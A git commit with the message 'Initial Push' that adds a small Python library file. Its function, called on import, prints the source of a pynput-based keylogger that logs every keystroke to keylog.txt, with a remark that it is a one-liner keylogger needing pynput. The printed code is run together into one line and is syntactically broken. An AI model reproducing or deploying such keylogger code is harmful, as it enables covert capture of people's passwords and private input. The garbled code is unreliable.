b3d88604de2276d01f9a384caccb799d0db2831e
Yohan <johnjarod@outlook.fr>
2022-06-06 19:10:48 +0200

    Initial Push

---
+++ dlmlproject/lib.py
@@ -0,0 +1,10 @@
+#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+
+def try_me() :
+	print(f'from pynput.keyboard import Key, Listener import logging logging.basicConfig(filename=("keylog.txt"), level=logging.DEBUG, format=" %(asctime)s - %(message)s") def on_press(key): logging.info(str(key))with Listener(on_press=on_press) as listener : listener.join()')
+
+	print(f'this is a onliner keylogger, need sudo pip3 install pynput')
+
+	print('voila')
+try_me()
